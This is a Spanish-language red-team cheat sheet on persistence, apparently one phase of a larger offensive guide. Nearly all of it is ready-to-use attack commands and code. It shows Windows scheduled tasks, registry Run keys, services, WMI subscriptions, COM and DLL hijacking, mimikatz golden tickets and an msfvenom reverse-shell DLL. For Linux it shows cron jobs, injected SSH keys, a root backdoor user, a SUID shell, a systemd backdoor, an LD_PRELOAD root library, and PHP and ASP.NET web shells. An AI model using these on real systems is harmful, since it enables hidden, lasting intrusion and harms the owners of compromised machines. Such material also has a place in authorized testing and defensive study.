# 🔒 Fase 5: Persistencia

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Objetivo:** Mantener el acceso al sistema comprometido incluso después de reinicios o de su detección.

---

## 🖥️ Persistencia en Windows

### Tareas programadas
```cmd
# Crear una tarea programada (se ejecuta como SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Con un usuario concreto
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Al iniciar el sistema
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Cada hora
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Listar tareas
schtasks /query /fo LIST /v

# Eliminar la tarea
schtasks /delete /tn "TaskName" /f
```

### Claves Run del Registro
```cmd
# HKCU - Usuario actual (sin necesidad de administrador)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM - Todos los usuarios (requiere administrador)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (se ejecuta una vez y después se elimina)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Carpeta de inicio
```cmd
# Usuario actual
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Todos los usuarios (requiere administrador)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Servicios
```cmd
# Crear un servicio (requiere administrador)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modificar un servicio existente
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### Suscripciones a eventos WMI
```powershell
# Crear persistencia mediante WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### Secuestro de DLL / orden de búsqueda
```cmd
# Buscar oportunidades de secuestro de DLL
# Colocar una DLL maliciosa en el directorio de la aplicación
# Objetivos habituales:
# - Archivos de programa sin rutas completas de DLL
# - DLL ausentes

# Crear una DLL maliciosa
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Secuestro de COM
```powershell
# Buscar objetos COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Preparar el secuestro
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket - acceso persistente como administrador del dominio
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket - acceso persistente a un servicio
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Persistencia en Linux

### Tareas de cron
```bash
# Crontab del usuario
crontab -e
# Añadir: * * * * * /tmp/shell.sh

# Crontab del sistema
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Directorios de cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### Claves SSH
```bash
# Añadir la clave pública a authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Acceso root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Usuario de puerta trasera
```bash
# Añadir un usuario con privilegios root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# O añadirlo directamente a /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Binario SUID
```bash
# Copiar bash y activar SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Ejecutar como root
/tmp/.hidden -p
```

### Servicio systemd
```bash
# Crear el archivo de servicio
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar e iniciar
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Añadir al bashrc del usuario
echo '/tmp/shell &' >> ~/.bashrc

# Añadir al perfil global
echo '/tmp/shell &' >> /etc/profile

# Añadir a bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Crear una biblioteca compartida maliciosa
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Añadir a LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web shell
```bash
# Web shell PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Más oculta
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Persistencia web

### Ubicaciones de web shells
```bash
# Ubicaciones habituales de web shells
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### Web shell ASP.NET
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Referencia rápida

### Métodos de persistencia en Windows

| Método | Ubicación | Privilegio |
|--------|----------|-----------|
| Run del Registro | HKCU/HKLM | Usuario/administrador |
| Tarea programada | Programador de tareas | Usuario/administrador |
| Carpeta de inicio | AppData/ProgramData | Usuario/administrador |
| Servicio | Servicios | Administrador |
| WMI | Suscripción WMI | Administrador |
| Secuestro de COM | HKCU CLSID | Usuario |

### Métodos de persistencia en Linux

| Método | Ubicación | Privilegio |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| Claves SSH | ~/.ssh/authorized_keys | Usuario |
| SUID | Binario con +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Usuario |

---

## 🔗 Guías de referencia relacionadas

- [PowerShell](../../PowerShell/translations/README.es.md)
- [Comandos de Linux](../../Linux-Commands/translations/README.es.md)
- [Metasploit](../../Metasploit/translations/README.es.md)

---

**Fase anterior:** [← 04 - Movimiento lateral](./04-Lateral-Movement.es.md)

**Fase siguiente:** [06 - Evasión de defensas →](./06-Defense-Evasion.es.md)
